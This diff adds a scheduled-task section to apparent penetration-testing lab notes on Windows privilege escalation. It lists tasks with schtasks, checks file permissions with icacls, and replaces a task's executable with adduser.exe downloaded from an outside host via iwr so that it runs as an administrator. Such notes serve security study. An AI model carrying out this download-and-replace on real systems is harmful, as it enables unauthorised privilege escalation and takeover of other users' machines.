@@ -2,6 +2,59 @@
 
 ## Scheduled Tasks
 
+We should seek interesting information in the _Author_, _TaskName_, _Task To Run_, _Run As User_, and _Next Run Time_ fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.
+
+{% code title="Display a list of all scheduled tasks" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\steve> schtasks /query /fo LIST /v
+...
+Folder: \Microsoft
+HostName:                             CLIENTWK220
+TaskName:                             \Microsoft\CacheCleanup
+Next Run Time:                        7/11/2022 2:47:21 AM
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        7/11/2022 2:46:22 AM
+Last Result:                          0
+Author:                               CLIENTWK220\daveadmin
+Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
+Start In:                             C:\Users\steve\Pictures
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode
+Run As User:                          daveadmin
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: Disabled
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        One Time Only, Minute
+Start Time:                           7:37:21 AM
+Start Date:                           7/4/2022
+...
+
+```
+{% endcode %}
+
+{% code title="Display permissions on the executable file BackendCacheCleanup.exe" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
+                                                BUILTIN\Administrators:(I)(F)
+                                                CLIENTWK220\steve:(I)(F)
+                                                CLIENTWK220\offsec:(I)(F)
+```
+{% endcode %}
+
+{% code title="Download and replace executable file BackendCacheCleanup.exe" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
+
+PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+
+PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
+```
+{% endcode %}
+
 Scheduled tasks can be listed from the command line using the `schtasks` command, using the task scheduler, or, if possible, uploading a tool such as Autoruns64.exe to the target system.
 
 ## AlwaysInstallElevated
